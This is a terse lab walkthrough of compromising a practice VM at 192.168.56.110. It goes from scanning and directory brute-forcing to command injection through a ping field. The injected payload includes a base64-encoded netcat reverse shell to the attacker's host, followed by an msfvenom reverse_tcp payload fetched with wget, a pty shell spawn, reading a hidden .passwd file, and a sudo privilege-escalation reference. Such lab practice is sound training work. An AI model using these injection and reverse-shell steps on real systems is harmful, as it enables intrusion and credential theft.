# Hacklabs 192.168.56.110
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.001.png)

sudo nmap -O -sV -sC -F 192.168.56.110 -oN initial\_scan

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.002.png)

gobuster dir fuzz -u 192.168.56.110 -w /usr/share/dirb/wordlists/big.txt -o host\_dir\_enum

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.003.png)

gobuster dir fuzz -x php -u 192.168.56.110 -w /usr/share/dirb/wordlists/big.txt -o host\_dir\_enum

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.004.png)



go to some of these pages

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.005.png)

echo "ls" | base64

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.006.png)

ping 127.0.0.1 | `echo "bHMK" | base64 -d`

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.007.png)

echo "ls -lah" | base64

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.008.png)

ping 127.0.0.1 | `echo "bHMgLWxhaAo=" | base64 -d`

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.009.png)

ping 127.0.0.1 | `echo 'bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAxIDQ0NDQK' | base64 -d`

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.010.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.011.png)

lscpu

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.012.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.013.png)

sudo msfvenom -p linux/x86/shell/reverse\_tcp -o shell LHOST=192.168.56.101 LPORT=8000

sudo python -m http.server 80

wget <http://192.168.56.101/shell>

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.014.png)

don’t know why but doesn’t work so 

ls /usr/share/applications | grep python

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.015.png)

python3 -c 'import pty; pty.spawn("/bin/bash")'

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.016.png)



cat yash/flag1.txt

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.017.png)

ls haclabs -lah

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.018.png)

locate .pass

cat /usr/share/hidden/.passwd

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.019.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.020.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.021.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.022.png)

<https://andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/>

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.023.png)

![](hacklabs_noname_steps/Aspose.Words.68090ecf-3118-4aa5-ad42-2c3ecc689afc.024.png)
